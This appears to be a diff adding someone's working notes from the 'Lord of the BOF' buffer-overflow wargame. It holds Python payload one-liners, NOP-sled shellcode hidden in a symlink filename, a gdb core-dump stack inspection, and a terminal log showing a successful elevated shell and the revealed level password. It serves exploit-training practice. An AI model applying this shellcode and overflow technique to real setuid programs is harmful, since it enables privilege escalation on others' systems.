@@ -1,0 +1,263 @@
+AAAA
+
+\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+48
+
+
+
+
+
+`python -c 'print "A"*44+"\x51\xfc\xff\xbf"'`
+
+
+python -c 'print "A"*44+"\xe5\xff\xff\xbf"'
+
+ln -s skeletom `python -c 'print "AA"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100+"AA"'`
+
+
+ln -s skeletom `python -c 'print "SS"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100+"AA"'`
+
+./AA~~~ `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`
+
+
+
+`python -c 'print "AA"+"
+
+
+Xshell 5 (Build 1339)
+Copyright (c) 2002-2017 NetSarang Computer, Inc. All rights reserved.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+Connecting to 192.168.235.128:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: vampire
+Password: 
+Last login: Wed Apr 11 17:25:41 from 192.168.235.1
+[vampire@localhost vampire]$ ls
+skeleton  skeleton.c
+[vampire@localhost vampire]$ bash2
+[vampire@localhost vampire]$ ln -s skeleton `python -c 'print "AA"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100+"AA"'`
+[vampire@localhost vampire]$ ls
+AA????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵ꀨ쀿ÿ2i00tii0cjo?㐔?࿱?̿????????????????????????????????????????????????????????????????????????????????????????????????????AA
+skeleton
+skeleton.c
+[vampire@localhost vampire]$ `python -c 'print "A"*44+"\x51\xfc\xff\xbf"'`
+bash2: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ蟣ommand not found
+AA `python -c 'print "A"*44+"\x51\xfc\xff\xbf"'`髿ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ
+Segmentation fault
+AA `python -c 'print "A"*44+"\x51\xfc\xff\xbf"'`髿ÿÿ2i00tii0cjo㐔⚱^L΁ 
+[vampire@localhost vampire]$ sdaf
+bash2: sdaf: command not found
+AA mpire@localhost vampire]$ ./AAꝑ^1ɱ2l^Nÿ^A蝁uꝅ髿ÿÿ2i00tii0cjo㐔⚱^L΁ 
+argv error
+AA mpire@localhost vampire]$ ./AAꝑ^1ɱ2l^Nÿ^A蝁uꝅ髿ÿÿ2i00tii0cjo㐔⚱^L΁ 
+argv error
+AA  ./AA~~~ `python -c 'print "A"*44+"\xff\xff\xff\xbf"'`ii0cjo㐔⚱^L΁ 
+stack is still your friend.
+AA  ./AA~~~ `python -c 'print "A"*44+"\xff\xff\xff\xbf"'`ii0cjo㐔⚱^L΁ 
+stack is still your friend.
+AA  `python -c 'print "A"*44+"\xff\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿÿ¿
+Segmentation fault
+[vampire@localhost vampire]$ ln -s skeletom `python -c 'print "SS"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100+"AA"'`
+[vampire@localhost vampire]$ ls
+AA????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵ꀨ쀿ÿ2i00tii0cjo?㐔?࿱?̿????????????????????????????????????????????????????????????????????????????????????????????????????AA
+SS????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵ꀨ쀿ÿ2i00tii0cjo?㐔?࿱?̿????????????????????????????????????????????????????????????????????????????????????????????????????AA
+skeleton
+skeleton.c
+[vampire@localhost vampire]$ cp skeleton skeletom
+[vampire@localhost vampire]$ ls
+AA????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵ꀨ쀿ÿ2i00tii0cjo?㐔?࿱?̿????????????????????????????????????????????????????????????????????????????????????????????????????AA
+SS????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵ꀨ쀿ÿ2i00tii0cjo?㐔?࿱?̿????????????????????????????????????????????????????????????????????????????????????????????????????AA
+skeletom
+skeleton
+skeleton.c
+AA  `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¿¿¿¿
+Segmentation fault (core dumped)
+[vampire@localhost vampire]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `                                                                              '.
+Program terminated with signal 11, Segmentation fault.
+#0  0xbfbfbfbf in ?? ()
+(gdb) x/100x $esp+1200
+0xbffffcb0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffcc0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffcd0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffce0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffcf0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd00:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd10:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd20:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd30:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd40:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd50:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd60:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd70:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd80:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffd90:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffda0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffdb0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffdc0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffdd0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffde0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffdf0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe00:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe10:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe20:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe30:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) 
+0xbffffe40:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe50:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe60:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe70:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe80:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffe90:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffea0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffeb0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffec0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffed0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffee0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffef0:	0x00000000	0x00000000	0x00000000	0x532f2e00
+0xbfffff00:	0x90909053	0x90909090	0x90909090	0x90909090
+0xbfffff10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff40:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff50:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff60:	0x90909090	0x5e11eb90	0x32b1c931	0xff0e6c80
+0xbfffff70:	0x01e98001	0x05ebf675	0xffffeae8	0x51c132ff
+0xbfffff80:	0x74303069	0x63306969	0xe48a6f6a	0xe28a5451
+0xbfffff90:	0xce0cb19a	0x90909081	0x90909090	0x90909090
+0xbfffffa0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffffb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffffc0:	0x90909090	0x90909090	0x90909090	0x90909090
+(gdb) 
+0xbfffffd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffffe0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffff0:	0x90909090	0x90909090	0x00414190	0x00000000
+0xc0000000:	Cannot access memory at address 0xc0000000
+[vampire@localhost vampire]$ adf
+bash2: adf: command not found
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+[vampire@localhost vampire]$ 
+[vampire@localhost vampire]$ 
+[vampire@localhost vampire]$ 
+[vampire@localhost vampire]$ 
+[vampire@localhost vampire]$ 
+AA  `python -c 'print "A"*44+"\x60\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`ÿÿ¿
+bash$ my-pass
+euid = 509
+music world
+bash$ ext
+sh: ext: command not found
+bash$ exit
+exit
+[vampire@localhost vampire]$ 
+[vampire@localhost vampire]$ d
+bash2: d: command not found
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁            // 마지막 주소를 20하면 안따이는데 20 이상하면 따임 왜지;;;;;;;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+AA  `python -c 'print "A"*44+"\x20\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+AA  `python -c 'print "A"*44+"\x30\xff\xff\xbf"'`.ÿÿ2i00tii0cjo㐔⚱^L΁ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ÿÿ¿
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ my-pass
+euid = 510
+shellcoder
+bash$ exit
+exit
+[vampire@localhost vampire]$ exit
+exit
+[vampire@localhost vampire]$ exit
+logout
+Connection closing...Socket close.
+
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 01:51:03.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+
